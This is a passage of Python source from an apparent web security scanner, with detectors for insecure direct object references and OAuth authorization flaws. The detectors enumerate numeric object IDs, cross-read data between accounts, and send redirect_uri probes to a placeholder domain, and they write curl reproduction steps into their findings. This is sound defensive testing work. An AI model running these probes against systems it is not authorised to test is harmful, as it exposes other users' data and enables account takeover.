    for cand in candidates[:8]:
        url = cand if cand.startswith("http") else urljoin(ctx.target_url, cand.lstrip("/"))
        # 数字标识**不要求两位以上**：`/rest/basket/1`、`/api/BasketItems/1`
        # 这种单位数 id 才是 RESTful 的主流形态，卡 `\d{2,}` 会把它们
        # 整片滤掉（候选里看着有几十个，实际测的全是两位以上的噪声）。
        # 但要限定数字必须是**完整的路径末段**，避免 `/api/v1` 这类混入。
        if ctx.domain not in url or not re.search(r"/\d+(/|$|\?)", url):
            continue
        m = re.search(r"/(\d+)(/|$|\?)", url)
        num = m.group(1)
        probes += 1
        pr = ctx.get(url)
        if not is_real_hit(ctx, pr, min_len=50):
            continue
        body = getattr(pr, "body_snippet", "") or ""
        # 匿名访问就返回了看起来像业务对象的数据
        if re.search(r"(\"(userId|orderId|mobile|phone|email|balance|amount|address)\"|"
                     r"用户|订单|余额|手机号)", body, re.I) and \
                re.search(r"\d{4,}", body):
            exposed.append((url, num, body[:300]))

    if exposed:
        url, num, frag = exposed[0]
        findings.append(make_finding(
            "WSTG-ATHZ-04", "对象标识可直接遍历且无需凭据即可读取",
            ctx.target_name, endpoint=url, method="GET",
            param=re.search(r"(\d{2,})", url).group(1) if re.search(r"(\d{2,})", url) else "",
            severity="高危", confidence="High", evidence_level="A",
            description=("该地址仅凭一个数字标识就能返回业务对象内容，"
                         "且不需要任何登录凭据。标识是连续数字，"
                         "意味着改动这个数字就能读到别人的数据。"),
            technical_detail=(f"端点：{url}\n标识：{num}（连续可枚举）\n"
                              f"响应中出现的业务字段与数据特征：\n{frag}"),
            impact=("可直接批量读取他人业务对象，造成个人信息与业务数据泄露。"
                    "由于标识连续，攻击者可用脚本按顺序遍历，"
                    "影响范围通常是全量用户而非个别账号。"),
            reproduction=(f"curl -s '{url}'\n"
                          f"# 将标识 {num} 改为 {int(num) + 1 if num.isdigit() else num} 观察是否返回他人数据"),
            remediation=("① 每个对象访问都在服务端校验归属（当前用户 == 资源所有者）；"
                         "② 对象标识改用不可枚举的 UUID 只是缓解，不能替代归属校验；"
                         "③ 所有涉及对象读取的接口统一走同一归属校验组件，避免遗漏。"),
            compliance="等保2.0 安全计算环境-访问控制 / CWE-639",
            evidence=[finding_evidence("response", frag, f"对象读取 {url}")],
            grading_basis="实测匿名可读取业务对象内容，且标识可枚举，定高危",
        ))

    # ---- 登录态分支：双账号交叉读对象（IDOR 的主战场）----
    #
    # 匿名分支判不出「登录后能不能读别人的对象」，而真实系统的漏洞
    # 恰恰出在「登录了、但没校验归属」这一层。过去这一片全挂人工，
    # 于是靶场上一整片越权题永远检不出来。
    # 现在手里有 **2 组已回验的登录态**时，这一步是可以实测的 ——
    # A 建、B 读、匿名对照，三条响应摆在一起，结论是客观的。
    # 只有 1 组账号时**不开这一支**：一个人跟自己比对不出归属，
    # 硬报就是编造（红线 1 / 9）。
    cross_note = ""
    try:
        _auth_ok, _accts = recon_id._cfg(ctx)
    except Exception:  # noqa: BLE001
        _auth_ok, _accts = False, []
    if not findings:
        if len(_accts) >= 2:
            tried: list[str] = []
            cf, cp = _recon_cross_object_read(ctx, _accts, tried)
            probes += cp
            findings.extend(cf)
            if not cf:
                # Model 1（A 建 B 读）没确证时，再走 Model 2：预存在的
                # 按 id 寻址对象（Juice Shop 的 View Basket 这类真实 BOLA
                # 就是这种形态，建不出对象）。两条模型都试过才下「未确证」。
                ck, ckp = _recon_cross_object_read_keypath(ctx, _accts, tried)
                probes += ckp
                findings.extend(ck)
            cross_note = ("；登录态双账号交叉读："
                          + ("**确证归属校验缺失**（B 能读到 A 的对象，匿名被挡）"
                             if findings else "未确证（" + "；".join(tried[:4]) + "）"))
        elif _auth_ok:
            cross_note = ("；登录态交叉读未执行：只有 1 组已回验登录态，"
                          "一个人跟自己比对不出归属 —— 需第 2 组账号后重扫")
        else:
            cross_note = "；登录态交叉读未执行：无已回验登录态账号"

    note = (f"候选对象端点 {len(candidates)} 个，实测 {probes} 次，"
            f"{'确认对象归属校验缺失' if findings else '未发现可读的他人对象数据'}"
            + cross_note)

    # 红线 1：零探测不得判通过。整轮**一条对象访问都没真正测到**时——
    # 典型是候选全是 `?id=1` 这类查询参数式标识，被路径数字正则过滤光，
    # 于是 `continue` 到底、probes 一直为 0 —— 不得把「没测」伪装成
    # 「测了没发现」。归口为 N/A / 待确认（由采集健康度决定），与
    # `not candidates` 那个分支用同一套诚实收口。
    if probes == 0:
        return no_target_outcome(
            ctx,
            "可匿名读取业务对象内容的 RESTful 风格对象端点（数字路径段）",
            probes=2, evidence_kind="对象访问实测")
    return found(note, findings, probes=probes, evidence_kind="对象访问实测")


# ======================================================================
# WSTG-ATHZ-05 OAuth 弱点
# ======================================================================
@make_auto("WSTG-ATHZ-05", name="OAuth 授权流程弱点检测", tool="内置检测器 + JS 分析",
           risk=RISK_STANDARD, evidence_kind="OAuth 端点实测",
           detector_ref="checks/authz.py:athz05")
def athz05(ctx: DetectorContext):
    findings = []
    probes = 0
    blobs = "\n".join(list(ctx.js_result.get("bodies") or []) + [ctx.baseline_body])

    auth_eps = set()
    for m in re.finditer(r"[\"'](https?://[^\"']*(?:oauth|authorize|auth)[^\"']*)[\"']", blobs, re.I):
        if re.search(r"(authorize|oauth/authorize|connect/authorize)", m.group(1), re.I):
            auth_eps.add(m.group(1))
    for pre in ("oauth/authorize", "oauth2/authorize", "api/oauth/authorize",
                "connect/authorize", "auth/oauth/authorize"):
        pr = probe_or_none(ctx, pre)
        probes += 1
        if pr is not None and getattr(pr, "status", 0) in (200, 302, 400):
            auth_eps.add(urljoin(ctx.target_url, pre))

    if not auth_eps:
        return no_target_outcome(ctx, "OAuth 授权端点", probes=probes + 1, evidence_kind="OAuth 端点探测")

    ep = sorted(auth_eps)[0]
    issues = []

    # 1) redirect_uri 是否被严格校验：给一个明显无关的域名
    parsed = urlparse(ep)
    qs = parse_qs(parsed.query)
    qs.update({"client_id": qs.get("client_id", ["aiscan_probe"])[0] if isinstance(qs.get("client_id"), list) else "aiscan_probe",
               "redirect_uri": "https://aiscan-probe.invalid/callback",
               "response_type": "code", "state": "aiscanstate"})
    probe_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
    probes += 1
    try:
        pr = ctx.get(probe_url, allow_redirects=False)
        loc = ""
        for k, v in (getattr(pr, "headers", {}) or {}).items():
            if k.lower() == "location":
                loc = v
        st = getattr(pr, "status", 0)
        if st in (301, 302, 303, 307) and "aiscan-probe.invalid" in loc:
            issues.append(("redirect_uri 未校验，可跳转到任意外部域名", f"HTTP {st} → {loc}"))
        elif st == 200 and "aiscan-probe.invalid" in (getattr(pr, "body_snippet", "") or ""):
            issues.append(("redirect_uri 被原样回显且未拒绝", f"HTTP 200，正文中出现探测域名"))
        elif st in (400, 401, 403):
            pass  # 正确拒绝
    except Exception:  # noqa: BLE001
        pass

    # 2) response_type=token（隐式流，令牌会出现在 URL fragment）
    qs2 = dict(qs)
    qs2["response_type"] = "token"
    probe_url2 = parsed._replace(query=urlencode(qs2, doseq=True)).geturl()
    probes += 1
    try:
        pr2 = ctx.get(probe_url2, allow_redirects=False)
        if getattr(pr2, "status", 0) in (301, 302) and "access_token" in str(getattr(pr2, "headers", {})):
            issues.append(("支持隐式流（response_type=token）",
                           "令牌会出现在 URL fragment 中，易通过 Referer / 浏览器历史泄露"))
    except Exception:  # noqa: BLE001
        pass

    # 3) 前端是否原样信任 redirect_uri / 缺少 state
    if re.search(r"redirect_uri\s*[=:]\s*(?:location|window\.location|document\.URL)", blobs, re.I):
        issues.append(("前端直接把当前地址作为 redirect_uri", "可被诱导跳转到攻击者域名"))
    if not re.search(r"\bstate\b", blobs, re.I):
        issues.append(("未发现 state 参数使用", "缺少 CSRF 防护，授权码可被劫持绑定"))

    if issues:
        findings.append(make_finding(
            "WSTG-ATHZ-05", f"OAuth 授权流程存在 {len(issues)} 处弱点",
            ctx.target_name, endpoint=ep, method="GET", param="redirect_uri / state",
            severity="高危" if any("redirect_uri 未校验" in i[0] for i in issues) else "中危",
            confidence="High", evidence_level="A",
            description=("OAuth 授权端点在校验上存在缺口，可能导致授权码或令牌被交给攻击者控制的地址。"),
            technical_detail="发现的问题：\n" + "\n".join(
                f"  · {n}\n    {d}" for n, d in issues),
            impact=("① redirect_uri 未校验 → 攻击者诱导用户点击授权链接，"
                    "授权码被送到攻击者服务器，攻击者用其换取令牌，完成账号接管；"
                    "② 缺 state → 攻击者可将自己的授权码绑定到受害者账号；"
                    "③ 隐式流 → 令牌出现在 URL 中，通过 Referer 或日志泄露。"),
            reproduction=f"curl -si '{ep}?client_id=aiscan_probe&redirect_uri=https://aiscan-probe.invalid/callback&response_type=code&state=x' | head -20",
            remediation=("① redirect_uri 必须与注册值精确匹配（不接受子路径、通配符、参数追加）；"
                         "② 强制使用 state 且一次性校验；"
                         "③ 使用授权码 + PKCE，禁用隐式流；"
                         "④ 授权码一次性使用、有效期 ≤ 60 秒。"),
            compliance="等保2.0 安全计算环境-身份鉴别 / RFC 6749 安全最佳实践",
            evidence=[finding_evidence("response",
                                       "\n".join(f"{n} | {d}" for n, d in issues), "OAuth 校验结果")],
            grading_basis="实测授权端点校验缺失，可导致账号接管，定高危 / 中危",
        ))

    note = (f"识别 OAuth 授权端点 {len(auth_eps)} 个，测试 redirect_uri / state / 隐式流，"
            f"发现 {len(issues)} 处弱点")
    return found(note, findings, probes=probes, evidence_kind="OAuth 端点实测")
